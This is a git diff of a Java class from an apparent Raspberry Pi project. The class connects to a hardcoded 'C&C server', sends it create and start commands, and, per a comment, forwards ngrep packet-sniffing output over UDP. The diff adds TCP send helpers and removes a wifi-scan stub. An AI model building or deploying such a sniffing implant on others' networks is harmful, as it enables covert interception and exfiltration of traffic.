@@ -2,12 +2,12 @@ package rPi.controllers;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.net.InetAddress;
+import java.util.ArrayList;
 
 import rPi.connectors.Connector;
 
 /*
  * This class has the responsibility for networking and "calling home"
- *
  */
 
 public class ConnectionController {
@@ -26,20 +26,15 @@ public class ConnectionController {
 	StreamParser parser = new StreamParser();
 	
 	public ConnectionController() throws Exception{
-		SERVER_IP = InetAddress.getByName("10.16.171.97");
-		
-		
-		
-		
-		
-		
-		
+		SERVER_IP = InetAddress.getByName("10.16.167.8");	
+		System.out.println("Connectionscontroller constructor init'd");
 	}
+	
 	public BufferedReader connectToServer(){
 		// from here we get the command from the C&C server
 		inputFromServer = con.initTCPClient(SERVER_IP, DEFAULT_PORT); 
 		
-		System.out.println("her sendes create"); // useless shit protocol HAVE TO BE MITIGATED!!! 
+		System.out.println("tcp initialized, now sending create"); // useless shit protocol HAVE TO BE MITIGATED!!! 
 		con.sendTCP("create\n");
 		con.sendTCP("start\n");
 		return inputFromServer;
@@ -49,15 +44,20 @@ public class ConnectionController {
 		
 		con.sendUDP(outputStream); // The start sniffing method returns a buffered reader with output from ngrep
 	}
+	public void sendStringTCP(String str){
+		con.sendTCP(str);
+	}
+	public void sendArrayTCP(ArrayList<String[]> arrList){
+		for (String[] array : arrList){
+			for (String str : array){
+				con.sendTCP(str);
+			}
+		}
+	}
 		 
 	public void connectToNetwork(String SSID)
 	{
 		//Spr��ger lasse om hvordan man k��re script... 
 		
-	}
-	private String scanLocalNetworks()
-	{
-		//following works on linux/android but we need to find solutions to osx and winslows mc.exec("iw wlan0 scan");
-		return "";
 	}
 }
